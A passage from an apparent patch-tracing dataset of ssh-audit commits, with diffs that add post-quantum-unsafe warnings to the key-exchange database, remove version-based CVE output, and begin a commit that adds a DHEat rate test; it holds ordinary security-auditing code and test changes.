          "127:             'ecdh-sha2-1.3.132.0.33': [[], [FAIL_SMALL_ECC_MODULUS, FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # NIST P-224 / secp224r1",
          "128:             'ecdh-sha2-1.3.132.0.34': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # NIST P-384 / secp384r1",
          "129:             'ecdh-sha2-1.3.132.0.35': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # NIST P-521 / secp521r1",
          "130:             'ecdh-sha2-1.3.132.0.36': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],  # sect409k1",
          "131:             'ecdh-sha2-1.3.132.0.37': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # sect409r1",
          "132:             'ecdh-sha2-1.3.132.0.38': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],  # sect571k1",
          "135:             'ecdh-sha2-4MHB+NBt3AlaSRQ7MnB4cg==': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS], [WARN_NOT_PQ_SAFE]],  # sect163k1",
          "136:             'ecdh-sha2-5pPrSUQtIaTjUSt5VZNBjg==': [[], [FAIL_SMALL_ECC_MODULUS, FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # NIST P-192 / secp192r1",
          "137:             'ecdh-sha2-9UzNcgwTlEnSCECZa7V1mw==': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # NIST P-256 / secp256r1",
          "138:             'ecdh-sha2-brainpoolp256r1@genua.de': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],",
          "139:             'ecdh-sha2-brainpoolp384r1@genua.de': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],",
          "140:             'ecdh-sha2-brainpoolp521r1@genua.de': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],",
          "141:             'ecdh-sha2-curve25519': [[], [], [WARN_NOT_PQ_SAFE]],",
          "142:             'ecdh-sha2-D3FefCjYoJ/kfXgAyLddYA==': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # sect409r1",
          "143:             'ecdh-sha2-h/SsxnLCtRBh7I9ATyeB3A==': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # NIST P-521 / secp521r1",
          "144:             'ecdh-sha2-m/FtSAmrV4j/Wy6RVUaK7A==': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],  # sect409k1",
          "145:             'ecdh-sha2-mNVwCXAoS1HGmHpLvBC94w==': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],  # sect571k1",
          "146:             'ecdh-sha2-nistb233': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS], [WARN_NOT_PQ_SAFE]],",
          "147:             'ecdh-sha2-nistb409': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],",
          "148:             'ecdh-sha2-nistk163': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS], [WARN_NOT_PQ_SAFE]],",
          "149:             'ecdh-sha2-nistk233': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS], [WARN_NOT_PQ_SAFE]],",
          "150:             'ecdh-sha2-nistk283': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],",
          "151:             'ecdh-sha2-nistk409': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],",
          "152:             'ecdh-sha2-nistp192': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "153:             'ecdh-sha2-nistp224': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "154:             'ecdh-sha2-nistp256': [['5.7,d2013.62,l10.6.0'], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "155:             'ecdh-sha2-nistp384': [['5.7,d2013.62'], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "156:             'ecdh-sha2-nistp521': [['5.7,d2013.62'], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "157:             'ecdh-sha2-nistt571': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],",
          "158:             'ecdh-sha2-qCbG5Cn/jjsZ7nBeR7EnOA==': [[], [FAIL_SMALL_ECC_MODULUS, FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # sect233r1",
          "159:             'ecdh-sha2-qcFQaMAMGhTziMT0z+Tuzw==': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # NIST P-384 / secp384r1",
          "160:             'ecdh-sha2-VqBg4QRPjxx1EXZdV0GdWQ==': [[], [FAIL_NSA_BACKDOORED_CURVE, FAIL_SMALL_ECC_MODULUS], [WARN_NOT_PQ_SAFE]],  # NIST P-224 / secp224r1",
          "161:             'ecdh-sha2-wiRIU8TKjMZ418sMqlqtvQ==': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],  # sect283k1",
          "162:             'ecdh-sha2-zD/b3hu/71952ArpUG4OjQ==': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS], [WARN_NOT_PQ_SAFE]],  # sect233k1",
          "163:             'ecmqv-sha2': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],",
          "170:             'gss-13.3.132.0.10-sha256-*': [[], [FAIL_UNKNOWN], [WARN_NOT_PQ_SAFE]],",
          "171:             'gss-curve25519-sha256-*': [[], [], [WARN_NOT_PQ_SAFE]],",
          "172:             'gss-curve448-sha512-*': [[], [], [WARN_NOT_PQ_SAFE]],",
          "173:             'gss-gex-sha1-*': [[], [FAIL_SHA1], [WARN_NOT_PQ_SAFE]],",
          "174:             'gss-gex-sha256-*': [[], [], [WARN_NOT_PQ_SAFE]],",
          "175:             'gss-group14-sha1-*': [[], [FAIL_SHA1], [WARN_2048BIT_MODULUS, WARN_NOT_PQ_SAFE]],",
          "176:             'gss-group14-sha256-*': [[], [], [WARN_2048BIT_MODULUS, WARN_NOT_PQ_SAFE]],",
          "177:             'gss-group15-sha512-*': [[], [], [WARN_NOT_PQ_SAFE]],",
          "178:             'gss-group16-sha512-*': [[], [], [WARN_NOT_PQ_SAFE]],",
          "179:             'gss-group17-sha512-*': [[], [], [WARN_NOT_PQ_SAFE]],",
          "180:             'gss-group18-sha512-*': [[], [], [WARN_NOT_PQ_SAFE]],",
          "181:             'gss-group1-sha1-*': [[], [FAIL_1024BIT_MODULUS, FAIL_LOGJAM_ATTACK, FAIL_SHA1], [WARN_NOT_PQ_SAFE]],",
          "182:             'gss-nistp256-sha256-*': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "183:             'gss-nistp384-sha256-*': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "184:             'gss-nistp384-sha384-*': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "185:             'gss-nistp521-sha512-*': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "186:             'kexAlgoCurve25519SHA256': [[], [], [WARN_NOT_PQ_SAFE]],",
          "187:             'kexAlgoDH14SHA1': [[], [FAIL_SHA1], [WARN_2048BIT_MODULUS, WARN_NOT_PQ_SAFE]],",
          "188:             'kexAlgoDH1SHA1': [[], [FAIL_1024BIT_MODULUS, FAIL_LOGJAM_ATTACK, FAIL_SHA1], [WARN_NOT_PQ_SAFE]],",
          "189:             'kexAlgoECDH256': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "190:             'kexAlgoECDH384': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "191:             'kexAlgoECDH521': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],",
          "192:             'kexguess2@matt.ucc.asn.au': [['d2013.57'], [], [WARN_NOT_PQ_SAFE]],",
          "193:             'm383-sha384@libassh.org': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],",
          "194:             'm511-sha512@libassh.org': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],",
          "196:             'rsa1024-sha1': [[], [FAIL_1024BIT_MODULUS, FAIL_SHA1], [WARN_NOT_PQ_SAFE]],",
          "197:             'rsa2048-sha256': [[], [], [WARN_2048BIT_MODULUS, WARN_NOT_PQ_SAFE]],",
          "198:             'sm2kep-sha2-nistp256': [[], [FAIL_NSA_BACKDOORED_CURVE, FAIL_UNTRUSTED], [WARN_NOT_PQ_SAFE]],",
          "",
          "---------------"
        ],
        "test/test_ssh2.py||test/test_ssh2.py": [
          "File: test/test_ssh2.py -> test/test_ssh2.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "165:         self.audit(out, self._conf())",
          "166:         out.write()",
          "167:         lines = output_spy.flush()",
          "170:     def test_ssh2_server_invalid_first_packet(self, output_spy, virtual_socket):",
          "171:         vsocket = virtual_socket",
          "",
          "[Removed Lines]",
          "168:         assert len(lines) == 78",
          "",
          "[Added Lines]",
          "168:         assert len(lines) == 74",
          "",
          "---------------"
        ],
        "test/test_ssh2_kexdb.py||test/test_ssh2_kexdb.py": [
          "File: test/test_ssh2_kexdb.py -> test/test_ssh2_kexdb.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "8:     @pytest.fixture(autouse=True)",
          "9:     def init(self):",
          "10:         self.db = SSH2_KexDB.get_db()",
          "12:     def test_ssh2_kexdb(self):",
          "13:         '''Ensures that the SSH2_KexDB.ALGORITHMS dictionary is in the right format.'''",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "11:         self.pq_warning = SSH2_KexDB.WARN_NOT_PQ_SAFE",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "33:                 # The first entry denotes the versions when this algorithm was added to OpenSSH, Dropbear, and/or libssh, followed by when it was deprecated, and finally when it was removed.  Hence it must have between 0 and 3 entries.",
          "34:                 added_entry = alg_data[0]",
          "35:                 assert 0 <= len(added_entry) <= 3",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "39:     def test_kex_pq_unsafe(self):",
          "40:         '''Ensures that all key exchange algorithms are marked as post-quantum unsafe, unless they appear in a whitelist.'''",
          "42:         # These algorithms include protections against quantum attacks.",
          "43:         kex_pq_safe = [",
          "44:             \"ecdh-nistp256-kyber-512r3-sha256-d00@openquantumsafe.org\",",
          "45:             \"ecdh-nistp384-kyber-768r3-sha384-d00@openquantumsafe.org\",",
          "46:             \"ecdh-nistp521-kyber-1024r3-sha512-d00@openquantumsafe.org\",",
          "47:             \"ext-info-c\",",
          "48:             \"ext-info-s\",",
          "49:             \"kex-strict-c-v00@openssh.com\",",
          "50:             \"kex-strict-s-v00@openssh.com\",",
          "51:             \"mlkem768x25519-sha256\",",
          "52:             \"sntrup4591761x25519-sha512@tinyssh.org\",",
          "53:             \"sntrup761x25519-sha512@openssh.com\",",
          "54:             \"sntrup761x25519-sha512\",",
          "55:             \"x25519-kyber-512r3-sha256-d00@amazon.com\",",
          "56:             \"x25519-kyber512-sha512@aws.amazon.com\"",
          "57:         ]",
          "59:         failures = []",
          "60:         for kex_name in self.db['kex']:",
          "62:             # Skip key exchanges that are PQ safe.",
          "63:             if kex_name in kex_pq_safe:",
          "64:                 continue",
          "66:             # Ensure all other kex exchanges have the proper PQ unsafe flag set in their warnings list.",
          "67:             alg_data = self.db['kex'][kex_name]",
          "68:             if len(alg_data) < 3 or self.pq_warning not in alg_data[2]:",
          "69:                 failures.append(kex_name)",
          "71:         assert failures == []",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "93b30b42584cef103652b426ab62c0e8b32e2667",
      "candidate_info": {
        "commit_hash": "93b30b42584cef103652b426ab62c0e8b32e2667",
        "repo": "jtesta/ssh-audit",
        "commit_url": "https://github.com/jtesta/ssh-audit/commit/93b30b42584cef103652b426ab62c0e8b32e2667",
        "files": [
          "README.md",
          "src/ssh_audit/ssh_audit.py",
          "src/ssh_audit/versionvulnerabilitydb.py",
          "test/docker/expected_results/openssh_4.0p1_test1.json",
          "test/docker/expected_results/openssh_4.0p1_test1.txt",
          "test/docker/expected_results/openssh_5.6p1_test1.json",
          "test/docker/expected_results/openssh_5.6p1_test1.txt",
          "test/docker/expected_results/openssh_5.6p1_test2.json",
          "test/docker/expected_results/openssh_5.6p1_test2.txt",
          "test/docker/expected_results/openssh_5.6p1_test3.json",
          "test/docker/expected_results/openssh_5.6p1_test3.txt",
          "test/docker/expected_results/openssh_5.6p1_test4.json",
          "test/docker/expected_results/openssh_5.6p1_test4.txt",
          "test/docker/expected_results/openssh_5.6p1_test5.json",
          "test/docker/expected_results/openssh_5.6p1_test5.txt",
          "test/docker/expected_results/openssh_8.0p1_test1.json",
          "test/docker/expected_results/openssh_8.0p1_test1.txt",
          "test/docker/expected_results/openssh_8.0p1_test2.json",
          "test/docker/expected_results/openssh_8.0p1_test2.txt",
          "test/docker/expected_results/openssh_8.0p1_test3.json",
          "test/docker/expected_results/openssh_8.0p1_test3.txt",
          "test/test_build_struct.py",
          "test/test_ssh1.py",
          "test/test_ssh2.py"
        ],
        "message": "Removed version-based CVE information. (#240)",
        "before_after_code_files": [
          "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py",
          "src/ssh_audit/versionvulnerabilitydb.py||src/ssh_audit/versionvulnerabilitydb.py",
          "test/test_build_struct.py||test/test_build_struct.py",
          "test/test_ssh1.py||test/test_ssh1.py",
          "test/test_ssh2.py||test/test_ssh2.py"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py",
            "test/test_ssh2.py||test/test_ssh2.py"
          ],
          "candidate": [
            "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py",
            "test/test_ssh2.py||test/test_ssh2.py"
          ]
        }
      },
      "candidate_diff": {
        "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py": [
          "File: src/ssh_audit/ssh_audit.py -> src/ssh_audit/ssh_audit.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "61: from ssh_audit.ssh2_kexdb import SSH2_KexDB",
          "62: from ssh_audit.ssh_socket import SSH_Socket",
          "63: from ssh_audit.utils import Utils",
          "67: # no_idna_workaround = False",
          "",
          "[Removed Lines]",
          "64: from ssh_audit.versionvulnerabilitydb import VersionVulnerabilityDB",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "273:         out.good('(gen) compatibility: ' + ', '.join(comp_text))",
          "320:     with out:",
          "328:     if not out.is_section_empty() and not is_json_output:",
          "329:         out.head('# security')",
          "330:         out.flush_section()",
          "331:         out.sep()",
          "336: def output_fingerprints(out: OutputBuffer, algs: Algorithms, is_json_output: bool) -> None:",
          "337:     with out:",
          "",
          "[Removed Lines]",
          "276: def output_security_sub(out: OutputBuffer, sub: str, software: Optional[Software], client_audit: bool, padlen: int) -> List[Dict[str, Union[str, float]]]:",
          "277:     ret: List[Dict[str, Union[str, float]]] = []",
          "279:     secdb = VersionVulnerabilityDB.CVE if sub == 'cve' else VersionVulnerabilityDB.TXT",
          "280:     if software is None or software.product not in secdb:",
          "281:         return ret",
          "282:     for line in secdb[software.product]:",
          "283:         vfrom: str = ''",
          "284:         vtill: str = ''",
          "285:         vfrom, vtill = line[0:2]",
          "286:         if not software.between_versions(vfrom, vtill):",
          "287:             continue",
          "288:         target: int = 0",
          "289:         name: str = ''",
          "290:         target, name = line[2:4]",
          "291:         is_server = target & 1 == 1",
          "292:         is_client = target & 2 == 2",
          "293:         # is_local = target & 4 == 4",
          "295:         # If this security entry applies only to servers, but we're testing a client, then skip it.  Similarly, skip entries that apply only to clients, but we're testing a server.",
          "296:         if (is_server and not is_client and client_audit) or (is_client and not is_server and not client_audit):",
          "297:             continue",
          "298:         p = '' if out.batch else ' ' * (padlen - len(name))",
          "299:         if sub == 'cve':",
          "300:             cvss: float = 0.0",
          "301:             descr: str = ''",
          "302:             cvss, descr = line[4:6]",
          "304:             # Critical CVSS scores (>= 8.0) are printed as a fail, otherwise they are printed as a warning.",
          "305:             out_func = out.warn",
          "306:             if cvss >= 8.0:",
          "307:                 out_func = out.fail",
          "308:             out_func('(cve) {}{} -- (CVSSv2: {}) {}'.format(name, p, cvss, descr))",
          "309:             ret.append({'name': name, 'cvssv2': cvss, 'description': descr})",
          "310:         else:",
          "311:             descr = line[4]",
          "312:             out.fail('(sec) {}{} -- {}'.format(name, p, descr))",
          "314:     return ret",
          "317: def output_security(out: OutputBuffer, banner: Optional[Banner], client_audit: bool, padlen: int, is_json_output: bool) -> List[Dict[str, Union[str, float]]]:",
          "318:     cves = []",
          "321:         if banner is not None:",
          "322:             software = Software.parse(banner)",
          "323:             cves = output_security_sub(out, 'cve', software, client_audit, padlen)",
          "324:             _ = output_security_sub(out, 'txt', software, client_audit, padlen)",
          "325:             if banner.protocol[0] == 1:",
          "326:                 p = '' if out.batch else ' ' * (padlen - 14)",
          "327:                 out.fail('(sec) SSH v1 enabled{} -- SSH v1 can be exploited to recover plaintext passwords'.format(p))",
          "333:     return cves",
          "",
          "[Added Lines]",
          "275: def output_security(out: OutputBuffer, banner: Optional[Banner], padlen: int, is_json_output: bool) -> None:",
          "278:         if (banner is not None) and (banner.protocol[0] == 1):",
          "279:             p = '' if out.batch else ' ' * (padlen - 14)",
          "280:             out.fail('(sec) SSH v1 enabled{} -- SSH v1 can be exploited to recover plaintext passwords'.format(p))",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "384: def output_recommendations(out: OutputBuffer, algs: Algorithms, algorithm_recommendation_suppress_list: List[str], software: Optional[Software], is_json_output: bool, padlen: int = 0) -> bool:",
          "386:     ret = True",
          "412:     level_to_output = {",
          "413:         \"informational\": out.good,",
          "414:         \"warning\": out.warn,",
          "",
          "[Removed Lines]",
          "387:     # PuTTY's algorithms cannot be modified, so there's no point in issuing recommendations.",
          "388:     if (software is not None) and (software.product == Product.PuTTY):",
          "389:         max_vuln_version = 0.0",
          "390:         max_cvssv2_severity = 0.0",
          "391:         # Search the CVE database for the most recent vulnerable version and the max CVSSv2 score.",
          "392:         for cve_list in VersionVulnerabilityDB.CVE['PuTTY']:",
          "393:             vuln_version = float(cve_list[1])",
          "394:             cvssv2_severity = cve_list[4]",
          "395:             max_vuln_version = max(vuln_version, max_vuln_version)",
          "396:             max_cvssv2_severity = max(cvssv2_severity, max_cvssv2_severity)",
          "398:         fn = out.warn",
          "399:         if max_cvssv2_severity > 8.0:",
          "400:             fn = out.fail",
          "402:         # Assuming that PuTTY versions will always increment by 0.01, we can calculate the first safe version by adding 0.01 to the latest vulnerable version.",
          "403:         current_version = float(software.version)",
          "404:         upgrade_to_version = max_vuln_version + 0.01",
          "405:         if current_version < upgrade_to_version:",
          "406:             out.head('# recommendations')",
          "407:             fn('(rec) Upgrade to PuTTY v%.2f' % upgrade_to_version)",
          "408:             out.sep()",
          "409:             ret = False",
          "410:         return ret",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------",
          "--- Hunk 4 ---",
          "[Context before]",
          "694:         out.flush_section()",
          "695:         out.sep()",
          "696:     maxlen = algs.maxlen + 1",
          "698:     # Filled in by output_algorithms() with unidentified algs.",
          "699:     unknown_algorithms: List[str] = []",
          "",
          "[Removed Lines]",
          "697:     cves = output_security(out, banner, client_audit, maxlen, aconf.json)",
          "",
          "[Added Lines]",
          "624:     output_security(out, banner, maxlen, aconf.json)",
          "",
          "---------------",
          "--- Hunk 5 ---",
          "[Context before]",
          "729:     if aconf.json:",
          "730:         out.reset()",
          "731:         # Build & write the JSON struct.",
          "733:     elif len(unknown_algorithms) > 0:  # If we encountered any unknown algorithms, ask the user to report them.",
          "734:         out.warn(\"\\n\\n!!! WARNING: unknown algorithm(s) found!: %s.  If this is the latest version of ssh-audit (see <https://github.com/jtesta/ssh-audit/releases>), please create a new Github issue at <https://github.com/jtesta/ssh-audit/issues> with the full output above.\\n\" % ','.join(unknown_algorithms))",
          "",
          "[Removed Lines]",
          "732:         out.info(json.dumps(build_struct(aconf.host + \":\" + str(aconf.port), banner, cves, kex=kex, client_host=client_host, software=software, algorithms=algs, algorithm_recommendation_suppress_list=algorithm_recommendation_suppress_list, additional_notes=additional_notes), indent=4 if aconf.json_print_indent else None, sort_keys=True))",
          "",
          "[Added Lines]",
          "659:         out.info(json.dumps(build_struct(aconf.host + \":\" + str(aconf.port), banner, kex=kex, client_host=client_host, software=software, algorithms=algs, algorithm_recommendation_suppress_list=algorithm_recommendation_suppress_list, additional_notes=additional_notes), indent=4 if aconf.json_print_indent else None, sort_keys=True))",
          "",
          "---------------",
          "--- Hunk 6 ---",
          "[Context before]",
          "1078:     return aconf",
          "1083:     def fetch_notes(algorithm: str, alg_type: str) -> Dict[str, List[Optional[str]]]:",
          "1084:         '''Returns a dictionary containing the messages in the \"fail\", \"warn\", and \"info\" levels for this algorithm.'''",
          "",
          "[Removed Lines]",
          "1081: def build_struct(target_host: str, banner: Optional['Banner'], cves: List[Dict[str, Union[str, float]]], kex: Optional['SSH2_Kex'] = None, pkm: Optional['SSH1_PublicKeyMessage'] = None, client_host: Optional[str] = None, software: Optional[Software] = None, algorithms: Optional[Algorithms] = None, algorithm_recommendation_suppress_list: Optional[List[str]] = None, additional_notes: List[str] = []) -> Any:  # pylint: disable=dangerous-default-value",
          "",
          "[Added Lines]",
          "1008: def build_struct(target_host: str, banner: Optional['Banner'], kex: Optional['SSH2_Kex'] = None, pkm: Optional['SSH1_PublicKeyMessage'] = None, client_host: Optional[str] = None, software: Optional[Software] = None, algorithms: Optional[Algorithms] = None, algorithm_recommendation_suppress_list: Optional[List[str]] = None, additional_notes: List[str] = []) -> Any:  # pylint: disable=dangerous-default-value",
          "",
          "---------------",
          "--- Hunk 7 ---",
          "[Context before]",
          "1240:             'fp': pkm_fp,",
          "1241:         }]",
          "1246:     # Add in the recommendations.",
          "1247:     res['recommendations'] = get_algorithm_recommendations(algorithms, algorithm_recommendation_suppress_list, software, for_server=True)",
          "",
          "[Removed Lines]",
          "1243:     # Add in the CVE information.",
          "1244:     res['cves'] = cves",
          "",
          "[Added Lines]",
          "1170:     # Historically, CVE information was returned.  Now we'll just return an empty dictionary so as to not break any legacy clients.",
          "1171:     res['cves'] = []",
          "",
          "---------------"
        ],
        "src/ssh_audit/versionvulnerabilitydb.py||src/ssh_audit/versionvulnerabilitydb.py": [
          "File: src/ssh_audit/versionvulnerabilitydb.py -> src/ssh_audit/versionvulnerabilitydb.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "test/test_build_struct.py||test/test_build_struct.py": [
          "File: test/test_build_struct.py -> test/test_build_struct.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "36:     kex.set_host_key(\"ssh-rsa7\", b\"\\x00\\x00\\x00\\x07ssh-rsa\\x00\\x00\\x00\", 1024, '', 0)",
          "37:     kex.set_host_key(\"ssh-rsa8\", b\"\\x00\\x00\\x00\\x07ssh-rsa\\x00\\x00\\x00\", 1024, '', 0)",
          "41:     assert len(rv[\"fingerprints\"]) == (9 * 2)  # Each host key generates two hash fingerprints: one using SHA256, and one using MD5.",
          "",
          "[Removed Lines]",
          "39:     rv = ssh_audit.build_struct('localhost', None, [], kex=kex)",
          "",
          "[Added Lines]",
          "39:     rv = ssh_audit.build_struct('localhost', None, kex=kex)",
          "",
          "---------------"
        ],
        "test/test_ssh1.py||test/test_ssh1.py": [
          "File: test/test_ssh1.py -> test/test_ssh1.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "139:         self.audit(out, self._conf())",
          "140:         out.write()",
          "141:         lines = output_spy.flush()",
          "144:     def test_ssh1_server_invalid_first_packet(self, output_spy, virtual_socket):",
          "145:         vsocket = virtual_socket",
          "",
          "[Removed Lines]",
          "142:         assert len(lines) == 21",
          "",
          "[Added Lines]",
          "142:         assert len(lines) == 13",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "154:         out.write()",
          "155:         assert ret != 0",
          "156:         lines = output_spy.flush()",
          "158:         assert 'unknown message' in lines[-1]",
          "160:     def test_ssh1_server_invalid_checksum(self, output_spy, virtual_socket):",
          "",
          "[Removed Lines]",
          "157:         assert len(lines) == 14",
          "",
          "[Added Lines]",
          "157:         assert len(lines) == 6",
          "",
          "---------------"
        ],
        "test/test_ssh2.py||test/test_ssh2.py": [
          "File: test/test_ssh2.py -> test/test_ssh2.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "165:         self.audit(out, self._conf())",
          "166:         out.write()",
          "167:         lines = output_spy.flush()",
          "170:     def test_ssh2_server_invalid_first_packet(self, output_spy, virtual_socket):",
          "171:         vsocket = virtual_socket",
          "",
          "[Removed Lines]",
          "168:         assert len(lines) == 83",
          "",
          "[Added Lines]",
          "168:         assert len(lines) == 78",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "179:         out.write()",
          "180:         assert ret != 0",
          "181:         lines = output_spy.flush()",
          "183:         assert 'unknown message' in lines[-1]",
          "185:     def test_ssh2_gss_kex(self, output_spy, virtual_socket):",
          "",
          "[Removed Lines]",
          "182:         assert len(lines) == 9",
          "",
          "[Added Lines]",
          "182:         assert len(lines) == 4",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "8190fe59d07224ae1a6109098255b3c043f74bda",
      "candidate_info": {
        "commit_hash": "8190fe59d07224ae1a6109098255b3c043f74bda",
        "repo": "jtesta/ssh-audit",
        "commit_url": "https://github.com/jtesta/ssh-audit/commit/8190fe59d07224ae1a6109098255b3c043f74bda",
        "files": [
          "README.md",
          "docker_test.sh",
          "src/ssh_audit/auditconf.py",
          "src/ssh_audit/dheat.py",
          "src/ssh_audit/ssh_audit.py",
          "ssh-audit.1",
          "ssh-audit.py",
          "test/conftest.py",
          "test/docker/expected_results/dropbear_2019.78_test1.json",
          "test/docker/expected_results/openssh_4.0p1_test1.json",
          "test/docker/expected_results/openssh_5.6p1_test1.json",
          "test/docker/expected_results/openssh_5.6p1_test2.json",
          "test/docker/expected_results/openssh_5.6p1_test3.json",
          "test/docker/expected_results/openssh_5.6p1_test4.json",
          "test/docker/expected_results/openssh_5.6p1_test5.json",
          "test/docker/expected_results/openssh_8.0p1_test1.json",
          "test/docker/expected_results/openssh_8.0p1_test2.json",
          "test/docker/expected_results/openssh_8.0p1_test3.json",
          "test/docker/expected_results/tinyssh_20190101_test1.json",
          "test/test_dheater.py",
          "test/test_errors.py",
          "test/test_ssh1.py",
          "test/test_ssh2.py",
          "tox.ini"
        ],
        "message": "Added implementation for DHEat denial-of-service attack (CVE-2002-20001). (#211, #217)",
        "before_after_code_files": [
          "docker_test.sh||docker_test.sh",
          "src/ssh_audit/auditconf.py||src/ssh_audit/auditconf.py",
          "src/ssh_audit/dheat.py||src/ssh_audit/dheat.py",
          "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py",
          "ssh-audit.1||ssh-audit.1",
          "ssh-audit.py||ssh-audit.py",
          "test/conftest.py||test/conftest.py",
          "test/test_dheater.py||test/test_dheater.py",
          "test/test_errors.py||test/test_errors.py",
          "test/test_ssh1.py||test/test_ssh1.py",
          "test/test_ssh2.py||test/test_ssh2.py"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py",
            "test/test_ssh2.py||test/test_ssh2.py"
          ],
          "candidate": [
            "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py",
            "test/test_ssh2.py||test/test_ssh2.py"
          ]
        }
      },
      "candidate_diff": {
        "docker_test.sh||docker_test.sh": [
          "File: docker_test.sh -> docker_test.sh",
          "--- Hunk 1 ---",
          "[Context before]",
          "464:         exit 1",
          "465:     fi",
          "468:     actual_retval=$?",
          "469:     if [[ $actual_retval != \"$expected_retval\" ]]; then",
          "470:         echo -e \"${REDB}Unexpected return value.  Expected: ${expected_retval}; Actual: ${actual_retval}${CLR}\"",
          "",
          "[Removed Lines]",
          "467:     ./ssh-audit.py localhost:2222 > \"$test_result_stdout\"",
          "",
          "[Added Lines]",
          "467:     ./ssh-audit.py --skip-rate-test localhost:2222 > \"$test_result_stdout\"",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "478:         exit 1",
          "479:     fi",
          "482:     actual_retval=$?",
          "483:     if [[ $actual_retval != \"$expected_retval\" ]]; then",
          "484:         echo -e \"${REDB}Unexpected return value.  Expected: ${expected_retval}; Actual: ${actual_retval}${CLR}\"",
          "",
          "[Removed Lines]",
          "481:     ./ssh-audit.py -jj localhost:2222 > \"$test_result_json\"",
          "",
          "[Added Lines]",
          "481:     ./ssh-audit.py --skip-rate-test -jj localhost:2222 > \"$test_result_json\"",
          "",
          "---------------"
        ],
        "src/ssh_audit/auditconf.py||src/ssh_audit/auditconf.py": [
